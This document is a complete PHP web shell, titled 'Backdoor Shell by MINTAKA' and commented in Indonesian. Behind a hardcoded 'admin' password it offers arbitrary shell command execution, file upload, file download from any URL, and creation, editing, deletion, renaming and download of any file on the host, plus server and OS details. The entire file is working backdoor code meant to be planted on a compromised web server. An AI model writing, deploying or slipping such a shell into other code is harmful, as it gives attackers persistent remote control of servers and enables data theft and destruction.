<?php
session_start();

// Password autentikasi
$password = 'admin';

// Autentikasi pengguna
if (isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
    } else {
        echo "<script>alert('Password salah');</script>";
    }
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    echo '<form method="post">
        Password: <input type="password" name="password">
        <input type="submit" value="Login">
    </form>';
    exit;
}

// Fungsi untuk mengunggah file
function uploadFile($file, $path) {
    if (!is_dir($path)) {
        mkdir($path, 0755, true);
    }
    $target_file = $path . basename($file["name"]);
    if (move_uploaded_file($file["tmp_name"], $target_file)) {
        echo "File uploaded successfully.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

// Fungsi untuk mengunggah file dari URL
function uploadFileFromURL($url, $filename, $path) {
    if (!is_dir($path)) {
        mkdir($path, 0777, true);
    }
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($path . $filename, $content);
        echo "File downloaded successfully.";
    } else {
        echo "Error downloading file.";
    }
}

// Fungsi untuk mengeksekusi perintah shell
function executeCommand($cmd) {
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

// Fungsi untuk membuat direktori baru
function createDirectory($path) {
    if (!is_dir($path)) {
        mkdir($path, 0755, true);
        echo "Directory created successfully.";
    } else {
        echo "Directory already exists.";
    }
}

// Fungsi untuk membuat file baru
function createFile($path, $content) {
    file_put_contents($path, $content);
    echo "File created successfully.";
}

// Fungsi untuk menghapus file atau direktori
function deleteFileOrDirectory($path) {
    if (is_dir($path)) {
        array_map('unlink', glob("$path/*.*"));
        rmdir($path);
    } else {
        unlink($path);
    }
    echo "Deleted successfully.";
}

// Fungsi untuk mengganti nama file atau direktori
function renameFileOrDirectory($oldName, $newName) {
    if (rename($oldName, $newName)) {
        echo "Renamed successfully.";
    } else {
        echo "Error renaming.";
    }
}

// Fungsi untuk mengunduh file
function downloadFile($file) {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File does not exist.";
    }
}

// Fungsi untuk menampilkan informasi server
function displayServerInfo() {
    echo "<b>Server Info:</b><br>";
    echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
    echo "PHP Version: " . phpversion() . "<br>";
    echo "PHP Uname: " . php_uname() . "<br>";
}

// Fungsi untuk menampilkan isi direktori
function listDirectoryContents($dir) {
    $files = scandir($dir);
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr>';
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $path = $dir . '/' . $file;
            $size = is_dir($path) ? 'N/A' : filesize($path) . ' bytes';
            $perm = substr(sprintf('%o', fileperms($path)), -4);
            echo '<tr>';
            echo '<td>' . $file . '</td>';
            echo '<td>' . $size . '</td>';
            echo '<td>' . $perm . '</td>';
            echo '<td>';
            echo '<a href="?edit=' . $path . '">Edit</a> | ';
            echo '<a href="?download=' . $path . '">Download</a> | ';
            echo '<a href="?delete=' . $path . '">Delete</a> | ';
            echo '<a href="?rename=' . $path . '">Rename</a>';
            echo '</td>';
            echo '</tr>';
        }
    }
    echo '</table>';
}

// Memproses unggahan file
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $path = isset($_POST['path']) ? $_POST['path'] : 'uploads/';
    uploadFile($_FILES['file'], $path);
}

// Memproses unggahan file dari URL
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['url']) && isset($_POST['filename'])) {
    $path = isset($_POST['path']) ? $_POST['path'] : 'downloads/';
    uploadFileFromURL($_POST['url'], $_POST['filename'], $path);
}

// Memproses eksekusi perintah
if (isset($_POST['cmd'])) {
    executeCommand($_POST['cmd']);
}

// Memproses pembuatan direktori
if (isset($_POST['new_dir'])) {
    createDirectory($_POST['new_dir']);
}

// Memproses pembuatan file
if (isset($_POST['new_file']) && isset($_POST['file_content'])) {
    createFile($_POST['new_file'], $_POST['file_content']);
}

// Memproses penghapusan file atau direktori
if (isset($_GET['delete'])) {
    deleteFileOrDirectory($_GET['delete']);
}

// Memproses pengunduhan file
if (isset($_GET['download'])) {
    downloadFile($_GET['download']);
}

// Memproses penggantian nama file atau direktori
if (isset($_GET['rename']) && isset($_POST['new_name'])) {
    renameFileOrDirectory($_GET['rename'], $_POST['new_name']);
}

// Memproses pengeditan file
if (isset($_GET['edit']) && isset($_POST['file_content'])) {
    file_put_contents($_GET['edit'], $_POST['file_content']);
    echo "File updated successfully.";
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Tampilkan antarmuka
?>
<!DOCTYPE html>
<html>
<head>
    <title>Backdoor Shell</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; background-color: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h1 { text-align: center; color: #444; }
        form { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"], textarea { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; }
        input[type="submit"], button { padding: 10px 15px; border: none; border-radius: 4px; background-color: #007BFF; color: white; cursor: pointer; }
        input[type="submit"]:hover, button:hover { background-color: #0056b3; }
        a { text-decoration: none; color: #007BFF; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        table, th, td { border: 1px solid #ddd; }
        th, td { padding: 10px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Backdoor Shell by MINTAKA.</h1>
        <form method="post" enctype="multipart/form-data">
            <label for="file">Choose file:</label>
            <input type="file" name="file" id="file">
            <label for="path">Path to save:</label>
            <input type="text" name="path" id="path" placeholder="Default: uploads/">
            <input type="submit" value="Upload">
        </form>

        <form method="post">
            <label for="url">File URL:</label>
            <input type="text" name="url" id="url">
            <label for="filename">Filename to save as:</label>
            <input type="text" name="filename" id="filename">
            <label for="path">Path to save:</label>
            <input type="text" name="path" id="path" placeholder="Default: downloads/">
            <input type="submit" value="Upload from URL">
        </form>

        <form method="post">
            <label for="cmd">Command:</label>
            <input type="text" name="cmd" id="cmd">
            <input type="submit" value="Execute">
        </form>

        <form method="post">
            <label for="new_dir">New Directory:</label>
            <input type="text" name="new_dir" id="new_dir">
            <input type="submit" value="Create Directory">
        </form>

        <form method="post">
            <label for="new_file">New File:</label>
            <input type="text" name="new_file" id="new_file">
            <label for="file_content">File Content:</label>
            <textarea name="file_content" id="file_content" rows="5"></textarea>
            <input type="submit" value="Create File">
        </form>

        <hr>

        <h2>Directory Contents</h2>
        <?php
        // Tampilkan isi direktori
        listDirectoryContents('.');
        ?>

        <br><br>
        <a href="?logout=true">Logout</a>

        <?php if (isset($_GET['rename'])): ?>
        <div>
            <h2>Rename File or Directory</h2>
            <form method="post">
                <label for="new_name">New Name:</label>
                <input type="text" name="new_name" id="new_name">
                <input type="submit" value="Rename">
            </form>
        </div>
        <?php endif; ?>

        <?php if (isset($_GET['edit'])): ?>
        <div>
            <h2>Edit File</h2>
            <form method="post">
                <label for="file_content">File Content:</label>
                <textarea name="file_content" id="file_content" rows="10"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
                <input type="submit" value="Save">
            </form>
        </div>
        <?php endif; ?>

    </div>
</body>
</html>
